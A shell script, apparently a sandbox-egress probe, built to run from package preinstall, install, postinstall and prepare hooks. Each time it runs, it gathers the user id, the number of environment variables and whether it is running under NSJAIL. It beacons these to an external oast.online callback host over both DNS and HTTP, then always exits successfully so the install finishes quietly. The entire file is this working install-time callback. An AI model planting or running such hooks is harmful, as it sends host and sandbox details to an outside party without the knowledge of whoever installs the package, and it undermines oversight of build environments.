#!/bin/sh
# H81 hooks probe. Called from preinstall/install/postinstall/prepare with a
# label argument. Emits a labelled DNS/HTTP callback (uid + env-name count in
# the query name/string only; no environment value is read) and always exits 0
# so the install still completes and the lint cell remains observable.
L="$1"
P="dc1hkt3kvv17699hpv0gam4nqd63ajqhc.oast.online"
Q="dc1hkt3kvv17699hpv0gfd7kd349ndaqg.oast.online"
U=$(id -u 2>/dev/null)
EN=$(env 2>/dev/null | wc -l)
NS=$(grep -c NSJAIL /proc/self/cgroup 2>/dev/null || echo 0)
echo "H81-HOOK label=$L uid=$U envn=$EN nsjail=$NS"
getent hosts "h81-${L}-u${U}-e${EN}-ns${NS}.$P" >/dev/null 2>&1 || true
curl -sS -m 8 "http://$P/h81-hook-${L}?u=$U&e=$EN&ns=$NS" >/dev/null 2>&1 || true
if false; then getent hosts "h81never-hook-control.$Q" >/dev/null 2>&1 || true; fi
exit 0
